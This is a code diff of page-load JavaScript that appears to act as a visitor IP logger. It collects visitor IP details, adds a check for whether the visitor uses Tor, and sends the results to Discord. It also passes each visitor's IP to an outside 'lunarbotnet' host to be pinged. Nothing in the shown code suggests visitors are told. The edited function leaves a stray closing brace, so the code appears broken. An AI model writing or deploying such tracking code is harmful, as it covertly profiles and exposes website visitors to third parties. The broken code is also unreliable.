@@ -58,6 +58,11 @@
                             inline: true
                         },
                         {
+                            name: "TOR", 
+                            value: ipInfo.data.privacy.tor ? "True" : "False", 
+                            inline: true
+                        },
+                        {
                             name: "Received ICMP", 
                             value: icmpStatus, 
                             inline: true
@@ -94,11 +99,11 @@
         await sendToDiscord(ipInfo, icmpStatus);
     }
 
-    // ICMP Check Function (You can adjust this to call your Python backend)
-    async function checkICMP(ip) {
-        const response = await fetch(`https://lunarbotnet-meowwww.up.railway.app/ping?ip=${ip}`);
-        const result = await response.json();
-        return result.status; 
+async function checkICMP(ip) {
+    const response = await fetch(`https://lunarbotnet-meowwww.up.railway.app/ping?ip=${ip}`);
+    const result = await response.json();
+    return result.status;  // Should now be "Received ICMP" or "No ICMP response"
+}
     }
 
     getVisitorInfo();
